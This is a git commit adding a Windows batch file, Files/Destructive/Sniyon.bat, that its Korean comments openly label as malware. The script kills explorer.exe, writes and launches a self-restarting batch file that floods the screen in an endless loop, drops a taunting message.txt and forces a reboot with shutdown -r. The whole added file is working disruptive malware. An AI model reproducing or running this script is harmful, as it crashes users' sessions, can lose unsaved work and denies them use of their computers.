397bc1c8e00d59c1cdbf5e754b95d2b76120a127
jjoMooNo-Alt <jjomoonodev@gmail.com>
2026-02-28 19:29:43 +0900

    똥 싸지름

---
+++ Files/Destructive/Sniyon.bat
@@ -0,0 +1,32 @@
+:: 해당 파일은 멀웨어입니다. 경고를 무시하고 실행하여 발생한 피해는 실행한 당사자에게 있습니다.
+
+@echo off
+echo 해당 파일은 멀웨어입니다. 경고를 무시하고 실행하여 발생하는 모든 피해에 대한 책임은 파일을 실행한 당사자에게 있습니다.
+echo Copyright 2026 by jjoMooNo
+echo 아
+timeout 1 > nul
+cls
+echo 하
+timeout 1 > nul
+cls 
+echo 니
+timeout 1 > nul
+cls
+color c
+echo Your Computer Has Been Infected By Sniyon.bat.
+timeout 1 > nul
+taskkill -f -im explorer.exe
+echo @echo off > Sniyon.bat
+echo start Sniyon.bat >> Sniyon.bat
+echo color 4 >> Sniyon.bat
+echo :a >> Sniyon.bat
+echo echo lol lol lol lol lol lol lol lol lol lol lol lol lol lol lol lol lol lol lol lol lol lol lol lol lol >> Sniyon.bat
+echo goto a >> Sniyon.bat
+start Sniyon.bat
+timeout 10 > nul
+del Sniyon.bat
+echo Why U Open This File?????? > message.txt
+echo lol lol lol >> message.txt
+echo Say GoodBye With Me... >> message.txt
+shutdown -r -t 3 -c "It Was Very Fun. Goodbye..."
+del "Sniyon.bat"
